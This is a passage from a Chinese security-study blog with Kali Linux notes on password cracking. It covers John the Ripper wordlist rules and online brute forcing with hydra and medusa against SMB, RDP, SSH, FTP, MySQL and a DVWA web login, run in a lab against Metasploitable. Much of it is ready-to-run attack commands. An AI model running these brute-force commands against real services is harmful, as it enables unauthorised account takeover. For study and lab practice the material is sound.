</li>
<li>用户密码变型<ul>
<li>基于cewl得结果进行密码变型</li>
<li>末尾增加数字串</li>
<li>字母大小写变化</li>
<li>字母与符号相互转换</li>
<li>字母与数字相互转换</li>
<li>P@$$w0ord</li>
</ul>
</li>
</ul>
<h4 id="7-字典–John-the-Ripper"><a href="#7-字典–John-the-Ripper" class="headerlink" title="7. 字典–John the Ripper"></a>7. 字典–John the Ripper</h4><ul>
<li>使用John the Ripper配置文件实现密码动态变型</li>
<li>/etc/john/john.conf<ul>
<li>[List.Rules:Wordlist]</li>
<li>$[0-9]$[0-9]$[0-9]</li>
<li><strong><code>🔺命令：cat a.txt | head -n 10 | cut -d &quot;,&quot; -f 1 &gt;  p.lst</code></strong>（a.txt为cewl生成的文件）</li>
<li><strong><code>🔺命令：john --wordlist=p.lst --rules --stdout &gt; m.txt</code></strong></li>
<li><strong><code>🔺命令：wc -l m.txt</code></strong>（查看m.txt里面有多少条记录）<br>– [List.Rules:test] $[0-9]$[0-9]$[0-9]$[a-zA-Z] $[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[<code>~!@#$%^&amp;*()\-_=+]
– **</code>🔺命令：john –wordlist=cewl.txt –rules=test –stdout &gt; m.txt<code>**
– **</code>🔺命令：john –wordlist=ahm.lst –rules=test HASHFILE`**</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url">Kali Linux笔记(六十)：在线密码破解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-25T23:13:23+08:00">
                2020-01-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-hydra（稳定性可能较差）"><a href="#1-hydra（稳定性可能较差）" class="headerlink" title="1. hydra（稳定性可能较差）"></a>1. hydra（稳定性可能较差）</h4><ul>
<li>在线密码破解–对在线服务的密码破解</li>
<li>离线密码破解–非在线服务的密码破解</li>
<li>Hydra<ul>
<li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li>
<li>-vV（查看详细信息）</li>
<li>-t（并发连接数）</li>
<li>-e nsr（’n’ → 空字符，’s’ → 账号和密码相同，’r’ → ‘调换账号和密码’）</li>
<li>-s（非默认输入端口）</li>
<li>-L（自定义密码文件）</li>
<li>-P（系统密码文件）</li>
</ul>
</li>
<li>Windows密码破解<ul>
<li>window2003设置密码，开启远程桌面（net share查看共享文件）</li>
<li><strong><code>🔺命令：hydra -l administartor -P pass.lst smb://1.1.1.1 -vV</code></strong></li>
<li><strong><code>🔺命令：hydra -l administartor -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></strong></li>
</ul>
</li>
<li>Linux密码破解<ul>
<li>设置Metasploitable的root登陆密码（sudo passwd root）</li>
<li><strong><code>🔺命令：hydra -l root -P pass.lst ssh://1.1.1.1 -vV</code></strong></li>
<li>▲ 日志服务器的报警</li>
</ul>
</li>
<li>其他服务密码破解<ul>
<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址</code></strong>（是否开启）</li>
<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址 -sV</code></strong>（开启的服务）</li>
<li><strong><code>🔺命令：hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></strong></li>
</ul>
</li>
<li>图形化界面<ul>
<li><strong><code>🔺命令：xhydra</code></strong>（旧版本为hydra-gtk）</li>
<li><strong><code>🔺命令：ftp 1.1.1.1</code></strong>（Metasploitable的21端口ftp服务配置错误，只要用户名正确，无密码）</li>
</ul>
</li>
<li>HTTP表单身份认证<ul>
<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot; -V</code></strong> </li>
<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed&quot; -V</code></strong></li>
<li>特征字符非Login Failed，为index.php，特征字符可以位于header中，也可以位于body</li>
<li>/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:Foo<ul>
<li>C：先访问指定页面取得cookie </li>
<li>H：指定http头</li>
</ul>
</li>
<li>https-post-form、https-get-form、https-get-form</li>
<li>-S:使用SSL连接</li>
</ul>
</li>
</ul>
<h4 id="2-pw-inspector"><a href="#2-pw-inspector" class="headerlink" title="2. pw-inspector"></a>2. pw-inspector</h4><ul>
<li>pw-inspector<ul>
<li>按长度和字符集筛选字典</li>
<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l</code></strong>（小写字母筛选）</li>
<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></strong>（大写字母筛选）</li>
<li>-m（最小位数）</li>
<li>-M（最大位数）</li>
</ul>
</li>
<li>密码破解效率<ul>
<li>密码复杂度（字典命中率）</li>
<li>带宽、协议、服务器性能、客户端性能</li>
<li>锁定阈值</li>
<li>单位时间最大登陆请求次数</li>
</ul>
</li>
</ul>
<h4 id="3-medusa"><a href="#3-medusa" class="headerlink" title="3. medusa"></a>3. medusa</h4><ul>
<li>Hydra的缺点<ul>
<li>稳定性差，程序时常崩溃</li>
<li>速度控制不好，容易触发服务屏蔽或锁死机制</li>
<li>每主机新建过程，每服务新建实例</li>
<li>大量目标破解时性能差</li>
<li>▲ 对CPU以及存储空间占用较大</li>
</ul>
</li>
<li>Medusa的特点<ul>
<li>稳定性好（单主机、多主机）</li>
<li>速度控制得当</li>
<li>基于线程</li>
<li>支持模块少于hydra（不支持RDP）</li>
<li>WEB-Form支持存在缺陷（只支持失败获得的信息，且只支持200响应代码的页面）</li>
</ul>
</li>
<li>常用参数<ul>
<li><strong><code>🔺命令：mdeusa -d</code></strong>（查看支持的模块）</li>
<li><strong><code>🔺命令：medusa -M</code></strong>（选择的模块）</li>
<li><strong><code>🔺命令：medusa -M 模块 -q</code></strong>（查看模块详细参数）</li>
<li>-m（大模块相应的参数）    </li>
<li>-h IP地址（选择的主机）-u 用户（指定用户）、-P 密码（指定密码文件）</li>
<li>-e（n/s/ns）（同hydra，但缺少参数r）</li>
<li>-F（获取一个即停止）</li>
<li>-T 数字（并发主机数）</li>
<li>-v 数字（显示破解过程的详细信息程度）</li>
<li>-n 端口（使用端口）</li>
<li>-s （使用SSL连接）</li>
</ul>
</li>
<li>破解Windows密码<ul>
<li><strong><code>🔺命令：net user administrator zipper</code></strong></li>
<li><strong><code>🔺命令：medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></strong></li>
</ul>
</li>
<li>破解Linux SSH密码（Metasploit）<ul>
<li><strong><code>🔺命令：cat /usr/share/wordlists/nmap.lst | grep -v \# &gt; pass.lst</code></strong></li>
<li><strong><code>🔺命令：medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></strong></li>
</ul>
</li>
<li>其他服务密码破解<ul>
<li><strong><code>🔺命令：medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F</code></strong></li>
<li><strong><code>🔺命令：medusa -M ftp -h 1.1.1.1 -u ftp -P pass.lst -e ns -F</code></strong></li>
<li><strong><code>🔺命令：medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;</code></strong> ▲ 2020.1.25实验无法破解密码</li>
</ul>
</li>
</ul>
<h4 id="4-在线密码破解"><a href="#4-在线密码破解" class="headerlink" title="4. 在线密码破解"></a>4. 在线密码破解</h4><ul>
<li>网站的在线密码破解</li>
<li>MD5：<a href="https://cmd5.com/" target="_blank" rel="noopener">https://cmd5.com/</a></li>
<li>多种Hash值：<a href="https://1024tools.com/hash" target="_blank" rel="noopener">https://1024tools.com/hash</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/8/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/10/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">155</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">144.5k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
